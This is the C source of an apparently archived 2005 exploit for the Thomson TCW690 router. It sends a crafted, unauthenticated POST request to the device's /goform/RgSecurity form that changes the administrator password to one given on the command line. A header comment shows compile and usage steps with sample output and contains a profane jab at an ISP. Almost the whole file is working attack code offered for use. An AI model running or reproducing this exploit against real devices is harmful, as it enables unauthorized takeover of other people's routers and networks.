/*****************************************************************   
*     Thomson TCW690 POST Password Validation exploit
*   
*  Tested with hardware version 2.1 and software version ST42.03.0a 
*  Bug found by: MurDoK <murdok.lnx at gmail.com> 
*  Date: 02.19.2005
*
*	sh-3.00$ gcc mdk_tcw690.c -o tcw690
*	sh-3.00$ ./tcw690 192.168.0.1 123
*	*****************************************
*	Thomson TCW690 POST Password Validation
*	Change password exploit coded by MurDoK
*	*****************************************
*	
*	[1] Connecting...
*	[2] Sending POST request...
*	[3] Done! go to http://192.168.0.1
*	sh-3.00$
*
* fuck AUNA :/
******************************************************************/ 
 
#include <netdb.h> 
 
int i=0, x=0, fd; 
struct sockaddr_in sock; 
struct hostent *he; 

char badcode[1000] = 
"POST /goform/RgSecurity HTTP/1.1\r\n" 
"Connection: Keep-Alive\r\n" 
"User-Agent: Mozilla/5.0 (compatible; Konqueror/3.3; Linux 2.4.28) KHTML/3.3.2 (like Gecko)\r\n" 
"Referer: http://192.168.0.1/RgSecurity.asp\r\n" 
"Pragma: no-cache\r\n" 
"Cache-control: no-cache\r\n" 
"Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\r\n" 
"Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n" 
"Accept-Charset: iso-8859-15, utf-8;q=0.5, *;q=0.5\r\n" 
"Accept-Language: es, en\r\n" 
"Host: 192.168.0.1\r\n" 
"Content-Type: application/x-www-form-urlencoded\r\n" 
"Authorization: Basic\r\n" 
"Content-Length: 62\r\n" 
"\r\n"; 
//"Password=hack1&PasswordReEnter=hack1&RestoreFactoryNo=0x00"; 
 
 
int main(int argc, char *argv[]) { 
 
//	system("clear"); 
	printf("*****************************************\n"); 
	printf(" Thomson TCW690 POST Password Validation\n"); 
	printf(" Change password exploit coded by MurDoK\n"); 
	printf("*****************************************\n\n"); 
	
	if(argc<3) { 
		printf("Usage: %s <router IP> <new_password>\n\n", argv[0]); 
		exit(1); 
	} 
	 
	fd = socket(AF_INET, SOCK_STREAM, 0); 
	 
	he = gethostbyname(argv[1]); 
	memset((char *) &sock, 0, sizeof(sock)); 
	 
	sock.sin_family = AF_INET; 
	sock.sin_port=htons(80); 
	sock.sin_addr.s_addr=*((unsigned long*)he->h_addr); 
	 
	printf("[1] Connecting... \n"); 
	 
	if ((connect(fd, (struct sockaddr *) &sock, sizeof(sock))) < 0) { 
		printf("ERROR: Can't connect to host!\n"); 
		return 0; 
	} 
 
	strcat(badcode, "Password="); 
	strcat(badcode, argv[2]); 
	strcat(badcode, "&PasswordReEnter="); 
	strcat(badcode, argv[2]); 
	strcat(badcode, "&RestoreFactoryNo=0x00"); 
	 
	printf("[2] Sending POST request...\n"); 
	write(fd, badcode, strlen(badcode)); 

	printf("[3] Done! go to http://%s\n", argv[1]); 
	 
	close(fd); 
	 
return 1; 
}

// milw0rm.com [2005-02-19]
